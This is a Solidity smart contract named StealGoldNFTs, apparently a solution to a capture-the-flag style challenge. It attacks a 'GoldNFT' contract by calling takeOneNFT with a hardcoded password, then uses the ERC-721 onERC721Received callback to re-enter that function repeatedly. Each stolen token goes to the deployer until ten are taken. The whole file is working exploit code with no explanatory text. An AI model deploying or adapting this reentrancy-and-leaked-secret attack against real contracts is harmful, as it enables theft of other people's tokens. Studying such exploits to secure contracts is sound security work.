// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGoldNFT {
    function takeOneNFT(bytes32 password) external;
    function transferFrom(address from, address to, uint256 tokenId) external;
}
contract StealGoldNFTs {
    IGoldNFT nfts;
    address owner;
    uint constant TOTAL_AMOUNT_TO_STEAL = 10;
    bytes32 constant password = 0x70617373776f7264000000000000000000000000000000000000000000000000;
    constructor(address _apesAddress) {
        nfts = IGoldNFT(_apesAddress);
        owner = msg.sender;
    }

    function attack() external {
        nfts.takeOneNFT(password);
    }

    function onERC721Received(
        address _sender, address _from, uint256 _tokenId, bytes memory _data)
        external returns (bytes4 retval) {
        
        require(msg.sender == address(nfts), "incorrect address");
        nfts.transferFrom(address(this), owner, _tokenId);

        if(_tokenId <= TOTAL_AMOUNT_TO_STEAL)  {
            nfts.takeOneNFT(password);
        }

        return StealGoldNFTs.onERC721Received.selector;
    }

}